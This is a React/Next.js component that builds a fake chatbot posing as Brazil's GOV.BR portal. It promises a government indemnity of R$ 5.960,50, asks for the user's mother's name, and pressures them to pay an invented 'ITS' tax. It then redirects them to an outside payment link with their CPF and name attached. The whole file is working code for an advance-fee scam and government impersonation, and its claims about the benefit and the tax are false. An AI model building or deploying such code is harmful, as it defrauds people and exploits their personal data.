
"use client";

import React, { useState, useEffect, useRef, useMemo } from 'react';
import { useRouter } from 'next/navigation';
import { Loader2, VolumeX } from 'lucide-react';
import dynamic from 'next/dynamic';
import type PlyrInstance from 'plyr';
import 'plyr-react/plyr.css';

const Plyr = dynamic(() => import('plyr-react'), {
  ssr: false,
});

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[];
  isTyping?: boolean;
}

interface FlowStepDetails {
  botMessage?: string | ((params: SimulatedChatParams) => string);
  options?:
    | { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]
    | ((params: SimulatedChatParams) => { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]);
  nextStepAfterVideo?: keyof typeof flowDefinition;
  nextStepAfterMessage?: keyof typeof flowDefinition; // New: For auto-proceeding after a message
  isRedirectStep?: boolean;
}

interface FlowDefinition {
  [key: string]: FlowStepDetails;
}


const flowDefinition: FlowDefinition = {
  intro_video: {
    botMessage: "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
    nextStepAfterVideo: 'start_greeting',
  },
  start_greeting: {
    botMessage: (params: SimulatedChatParams) => `Olá ${params.nome || 'usuário'}!`,
    nextStepAfterMessage: 'start_message_1',
  },
  start_message_1: {
    botMessage: "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.",
    nextStepAfterMessage: 'start_message_2',
  },
  start_message_2: {
    botMessage: "Responda às perguntas a seguir para aprovação do seu saque de R$ 5.960,50.",
    nextStepAfterMessage: 'start_prompt_mae',
  },
  start_prompt_mae: { // This was the original 'start'
    botMessage: "Por favor, confirme o nome de sua mãe.",
    options: [
      { text: "Raquel Queiroz Santos", value: 'raquel_qs', nextStep: 'ask_mae_again' },
      { text: "Fernanda de Sousa Rodrigues", value: 'fernanda_sr', nextStep: 'ask_mae_again' },
      { text: "Eliane Da Silva Moreira", value: 'eliane_sm_correct', nextStep: 'ask_question_1' },
      { text: "Nenhuma das alternativas.", value: 'nenhuma_mae', nextStep: 'ask_mae_again' }
    ],
  },
  ask_mae_again: {
    botMessage: "Por favor, digite o nome completo da sua mãe.",
    options: [{text: "Ok, entendi (simulação)", value: 'mae_understood', nextStep: 'ask_question_1'}]
  },
  ask_question_1: {
    botMessage: "Você possui alguma pendência financeira registrada no SERASA ou SPC?",
    options: [
      { text: "Sim", value: 'pendencia_sim', nextStep: 'ask_marital_status' },
      { text: "Não", value: 'pendencia_nao', nextStep: 'ask_marital_status' },
    ],
  },
  ask_marital_status: {
    botMessage: "Qual seu estado civil?",
    options: [
      { text: "Solteiro (a)", value: 'solteiro', nextStep: 'ask_payment_method' },
      { text: "Casado (a)", value: 'casado', nextStep: 'ask_payment_method' },
      { text: "Divorciado (a)", value: 'divorciado', nextStep: 'ask_payment_method' },
      { text: "Viúvo (a)", value: 'viuvo', nextStep: 'ask_payment_method' },
    ],
  },
  ask_payment_method: {
    botMessage: "Para a liberação do seu benefício, será necessário o pagamento de uma taxa única referente ao Imposto de Transmissão Social (ITS). Como deseja prosseguir?",
    options: [
      { text: "Pagar com Cartão de Crédito", value: 'cartao', nextStep: 'confirm_cpf' },
      { text: "Pagar com PIX (via CPF)", value: 'pix_cpf', nextStep: 'confirm_cpf' },
      { text: "Saber mais sobre a taxa", value: 'info_taxa', nextStep: 'explain_tax_briefly' },
    ],
  },
  explain_tax_briefly: {
    botMessage: "A taxa de Imposto de Transmissão Social (ITS) é um valor simbólico obrigatório para cobrir custos operacionais e garantir a segurança da transação e a liberação do seu benefício. O pagamento é processado de forma segura pela plataforma GOV.BR.",
    options: [
        { text: "Entendi, desejo pagar com PIX (CPF)", value: 'pix_cpf_after_explain', nextStep: 'confirm_cpf'},
        { text: "Entendi, desejo pagar com Cartão", value: 'cartao_after_explain', nextStep: 'confirm_cpf'},
        { text: "Voltar", value: 'back_to_payment_method', nextStep: 'ask_payment_method' },
    ]
  },
  confirm_cpf: {
    botMessage: (params: SimulatedChatParams) => `Seu CPF para o pagamento da taxa e recebimento do benefício é: ${params.cpf || 'Não informado'}. Está correto?`,
    options: (params: SimulatedChatParams) => [
      { text: "Sim, está correto.", value: 'cpf_correto', nextStep: 'ask_receipt' },
      { text: "Não, desejo alterar.", value: 'cpf_incorreto', nextStep: 'handle_cpf_correction' },
    ],
  },
  handle_cpf_correction: {
    botMessage: "Entendido. Para corrigir seu CPF, por favor, reinicie o processo ou entre em contato com o suporte.",
    options: [{ text: "Ok", value: 'cpf_correction_ack', nextStep: 'end_chat_early' }]
  },
  ask_receipt: {
    botMessage: "Excelente! Após a confirmação do pagamento da taxa, o valor do benefício será liberado. Você deseja receber o comprovante de recebimento do benefício em seu e-mail cadastrado no GOV.BR?",
    options: [
      { text: "Sim, desejo receber meu comprovante.", value: 'receipt_yes', nextStep: 'final_info_before_payment' },
      { text: "Não, obrigado.", value: 'receipt_no', nextStep: 'final_info_before_payment' },
    ],
  },
  final_info_before_payment: {
    botMessage: "Perfeito. Você está a um passo de receber sua indenização. A taxa ITS garante a liberação imediata após a confirmação.",
    options: [
      { text: "Concluir pagamento e receber minha indenização", value: 'proceed_to_payment', nextStep: 'redirect_to_payment' },
      { text: "Porque tenho que pagar esse imposto?", value: 'ask_why_tax_again', nextStep: 'explain_tax_detailed' },
    ],
  },
  explain_tax_detailed: {
    botMessage: "O Imposto de Transmissão Social (ITS) é uma contribuição única e obrigatória, estabelecida para cobrir despesas administrativas e de processamento seguro da sua indenização através da plataforma GOV.BR. Este valor garante a conformidade legal e a agilidade na liberação dos seus fundos. Após o pagamento, o valor integral da indenização é disponibilizado imediatamente.",
    options: [
      { text: "Entendi. Concluir pagamento e receber indenização.", value: 'proceed_to_payment_after_detail', nextStep: 'redirect_to_payment' },
      { text: "Ainda tenho dúvidas.", value: 'more_doubts', nextStep: 'support_contact' },
    ],
  },
  support_contact: {
    botMessage: "Para mais informações, por favor, acesse a seção de Ajuda no portal GOV.BR ou entre em contato com nosso suporte.",
    options: [{ text: "Ok", value: 'support_ack', nextStep: 'end_chat_early' }]
  },
  redirect_to_payment: {
    isRedirectStep: true,
  },
  end_chat_early: {
    botMessage: "Obrigado por utilizar nossos serviços. Sessão encerrada."
  }
};


const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStep, setCurrentStep] = useState<keyof typeof flowDefinition>('intro_video');
  const [isBotTyping, setIsBotTyping] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const router = useRouter();

  const playerRef = useRef<PlyrInstance | null>(null);
  const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
  const videoUrl = "https://225412.b-cdn.net/Video%20Page.mp4";

  const plyrSource = useMemo(() => ({
    type: 'video' as const,
    sources: [{ src: videoUrl, provider: 'html5' as const }],
  }), [videoUrl]);

  const plyrOptions = useMemo(() => ({
    controls: [],
    hideControls: true,
    clickToPlay: false,
    autoplay: true,
    muted: true,
    playsinline: true,
  }), []);


  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  useEffect(() => {
    const stepConfig = flowDefinition[currentStep];
    if (!stepConfig) return;

    if (currentStep === 'redirect_to_payment') {
      handleRedirectToPayment();
      return;
    }
    
    setIsBotTyping(true);
    
    setTimeout(() => {
      let botText = "";
      if (typeof stepConfig.botMessage === 'function') {
        botText = stepConfig.botMessage(initialParams);
      } else if (typeof stepConfig.botMessage === 'string') {
        botText = stepConfig.botMessage;
      }

      const newMessageId = `bot-${Date.now()}`;
      const botMsg: Message = { id: newMessageId, sender: 'bot', text: botText };
      
      let shouldAddMessage = !!botText;

      if (stepConfig.options) {
         if (typeof stepConfig.options === 'function') {
            botMsg.options = stepConfig.options(initialParams);
         } else {
            botMsg.options = stepConfig.options;
         }
         shouldAddMessage = true; 
      }
      
      if (shouldAddMessage && currentStep !== 'intro_video') { 
        setMessages(prev => [...prev, botMsg]);
      } else if (currentStep === 'intro_video' && botText) {
        // Ensure intro_video message is added if defined (it's handled once)
        if (!messages.find(m => m.text === botText && m.sender === 'bot')) {
            setMessages(prev => [...prev, {id: `bot-intro-${Date.now()}`, sender: 'bot', text: botText }]);
        }
      }
      
      setIsBotTyping(false);

      if (stepConfig.nextStepAfterMessage && !stepConfig.options) {
        setTimeout(() => { 
            setCurrentStep(stepConfig.nextStepAfterMessage as keyof typeof flowDefinition);
        }, 1200); 
      }

    }, 700); // Shorter delay for bot "typing" simulation

  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStep, initialParams]);


  const handleRedirectToPayment = () => {
    const basePaymentUrl = "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN";
    const queryParams = new URLSearchParams();
    if (initialParams.cpf) queryParams.set('document', initialParams.cpf.replace(/\D/g, ''));
    if (initialParams.nome) queryParams.set('name', initialParams.nome);
    if (initialParams.utm_campaign) queryParams.set('utm_campaign', initialParams.utm_campaign);
    if (initialParams.utm_content) queryParams.set('utm_content', initialParams.utm_content);
    if (initialParams.utm_medium) queryParams.set('utm_medium', initialParams.utm_medium);
    if (initialParams.utm_source) queryParams.set('utm_source', initialParams.utm_source);
    // utm_term is often part of these, let's add it as empty if not present or handle it if it becomes a param
    queryParams.set('utm_term', initialParams.gclid || ''); // Using gclid as a proxy or ensure it's available

    const finalUrl = `${basePaymentUrl}?${queryParams.toString()}`;
    window.location.href = finalUrl;
  };

  const handleOptionClick = (optionValue: string, nextStepKey?: keyof typeof flowDefinition) => {
    const userMessageId = `user-${Date.now()}`;
    const currentStepConfig = flowDefinition[currentStep];
    let userMessageText = optionValue;

    if (currentStepConfig?.options) {
        let currentOptions: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[] = [];
        if (typeof currentStepConfig.options === 'function') {
            currentOptions = currentStepConfig.options(initialParams);
        } else {
            currentOptions = currentStepConfig.options;
        }
        const clickedOption = currentOptions.find(opt => opt.value === optionValue);
        if (clickedOption) {
            userMessageText = clickedOption.text;
        }
    }

    setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: userMessageText }]);

    if (nextStepKey) {
      setCurrentStep(nextStepKey);
    }
  };
  
  const handleVideoThumbnailClick = async () => {
    if (playerRef.current?.plyr) {
      try {
        playerRef.current.plyr.muted = false;
        await playerRef.current.plyr.play();
        setShowVideoThumbnailOverlay(false);
        
        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
        if (nextStep) {
          // No need to re-add intro message, it's handled by the step itself now
          setTimeout(() => {
            setCurrentStep(nextStep);
          }, 500);
        }
      } catch (error) {
        console.error("Error trying to play/unmute video:", error);
        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
        if (nextStep) setCurrentStep(nextStep);
      }
    } else {
        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
        if (nextStep) setCurrentStep(nextStep);
    }
  };


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px' }}>
      {currentStep === 'intro_video' && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
           <p style={{ textAlign: 'center', marginBottom: '10px', fontSize: '16px', color: '#333' }}>
            {typeof flowDefinition.intro_video.botMessage === 'string' ? flowDefinition.intro_video.botMessage : ''}
          </p>
          <div className="video-player-wrapper" style={{ position: 'relative', maxWidth: '100%', width:'auto', aspectRatio: '16/9', margin: '0 auto', borderRadius: '8px', overflow: 'hidden' }}>
            <Plyr
              ref={playerRef}
              source={plyrSource}
              options={plyrOptions}
            />
            {showVideoThumbnailOverlay && (
              <div
                onClick={handleVideoThumbnailClick}
                style={{
                  position: 'absolute',
                  top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.5)',
                  display: 'flex',
                  flexDirection: 'column',
                  justifyContent: 'center',
                  alignItems: 'center',
                  cursor: 'pointer',
                  color: 'white',
                  zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px' }}>Clique para Ouvir</span>
              </div>
            )}
          </div>
        </div>
      )}

      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {msg.sender === 'bot' && (
              <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
            )}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text}
              {msg.sender === 'bot' && msg.options && !isBotTyping && (
                <div className="options-container" style={{ marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {msg.options.map(opt => (
                    <button
                      key={opt.value}
                      onClick={() => handleOptionClick(opt.value, opt.nextStep)}
                      className="chat-option-button"
                    >
                      {opt.text}
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}
      {isBotTyping && (
         <div className="message-container bot-message-container">
            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
            <div className="message bot-message typing-indicator">
                <span className="dot"></span>
                <span className="dot"></span>
                <span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .message-container {
          display: flex;
          margin-bottom: 12px;
          max-width: 85%;
        }
        .bot-message-container {
          align-self: flex-start;
        }
        .user-message-container {
          align-self: flex-end;
          flex-direction: row-reverse; 
        }
        .bot-avatar {
          width: 32px;
          height: 32px;
          border-radius: 50%;
          margin-right: 8px;
          margin-top: 4px; 
        }
        .user-message-container .bot-avatar { 
          display: none;
        }
        .message {
          padding: 10px 15px;
          border-radius: 18px;
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word;
        }
        .bot-message {
          background-color: #f1f0f0; 
          color: #000;
          border-top-left-radius: 4px;
        }
        .user-message {
          background-color: #007bff; 
          color: white;
          border-top-right-radius: 4px;
          margin-right: 0; 
        }
        .user-message-container .user-message {
            margin-left: auto; 
        }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-direction: column; 
          align-items: flex-start; 
          gap: 8px;
        }
        .chat-option-button {
          background-color: #fff;
          color: #007bff;
          border: 1px solid #007bff;
          padding: 8px 15px;
          border-radius: 15px;
          cursor: pointer;
          font-size: 14px;
          transition: background-color 0.2s, color 0.2s;
          text-align: left;
          width: auto; 
          display: inline-block; 
        }
        .chat-option-button:hover {
          background-color: #007bff;
          color: #fff;
        }
        .typing-indicator {
            display: inline-flex;
            align-items: center;
            padding: 10px 15px; 
        }
        .typing-indicator .dot {
            width: 8px;
            height: 8px;
            margin: 0 2px;
            background-color: #aaa; 
            border-radius: 50%;
            animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        .typing-indicator .dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;

    
